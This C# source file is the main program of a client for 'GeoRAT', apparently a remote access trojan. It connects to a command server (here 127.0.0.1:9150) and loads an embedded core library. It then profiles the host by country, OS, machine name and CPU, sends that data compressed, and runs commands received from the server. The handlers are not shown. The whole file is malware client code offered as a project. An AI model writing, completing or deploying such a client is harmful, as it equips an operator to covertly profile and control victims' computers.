﻿using System;
using System.Diagnostics;
using System.Net.Sockets;
using System.Reflection;
using Client;
using GeoRAT.Client.CommandHandlers;
using GeoRAT.Client.Network;
using GeoRAT.Client.Runtime;
using GeoRAT.Core.Commands;
using GeoRAT.Core.Compressor;
using GeoRAT.Core.PacketStruct;


namespace GeoRAT.Client
{
    class Program
    {
        static void Main(string[] args)
        {
            //Create new client network instance on ip / port
            //associate event handlers, begin listening 
            var network = new ClientNetwork("127.0.0.1", 9150);
            network.OnConnected += OnConnected;
            network.BeginConnect();
            //Load core .DLL
            LoadLibrary();
            Process.GetCurrentProcess().WaitForExit();
            

        }

        #region LoadLibraries

        static void LoadLibrary()
        {
            var dll = "GeoRAT.Client.Libraries.GeoRAT.Core.dll";
            EmbeddedAssembly.Load(dll, "GeoRAT.Client.Libraries.GeoRAT.Core.dll");
            AppDomain.CurrentDomain.AssemblyResolve += CurrentDomain_AssemblyResolve;
        }
        static Assembly CurrentDomain_AssemblyResolve(object sender, ResolveEventArgs args)
        {
            return EmbeddedAssembly.Get(args.Name);
        }


        #endregion
        //When connected to server 

        #region Connection

        static void OnConnected(Socket s)
        {
            Console.WriteLine("Connected to {0}", s.RemoteEndPoint.ToString());
            Console.WriteLine("WAITING For commands" + Environment.NewLine);
            //Create datareader instance from s Socket and begin reading data 
            DataReader reader = new DataReader(s);
            reader.OnDisconnected += OnDisconnectedHandler;
            reader.OnReceived += HandleCommand;

            Serializer ser = new Serializer();

            var i = new Info(GetInfo.GetCountry(), GetInfo.GetOs(), GetInfo.Name(),
                GetInfo.GetProcessorModel()); //Geenerate Info object 
            var buf = ser.Serialize(i);
            var cmp = Compression.Compress(buf); //Compress data using GZIP 
            var len = cmp.Length;
            var sendLen = BitConverter.GetBytes(len);
            if (sendLen.Length != 0 && cmp.Length != 0 )
            {
                reader.Send(sendLen); //Send data length
                reader.Send(cmp); //Send data itself 

            }
            else
            {
                 Process.GetCurrentProcess().Kill();
            }


        }

        #endregion

        #region Disconnection

        static void OnDisconnectedHandler(Socket socket)
        {
           
            socket.Dispose();
            Process.GetCurrentProcess().Kill();
        }




        #endregion

        #region Commands
        static void HandleCommand(byte[] buf, int size)
        {
            var handler = new CommandHandler();
            var sr = new CommandSerializer();
            var compressedbuf = Compression.Decompress(buf);
            var command = sr.Deserialize(compressedbuf);
            Console.WriteLine("Got new data, length {0} bytes", size);
            handler.Handle(command);
        }

        #endregion

    }
}
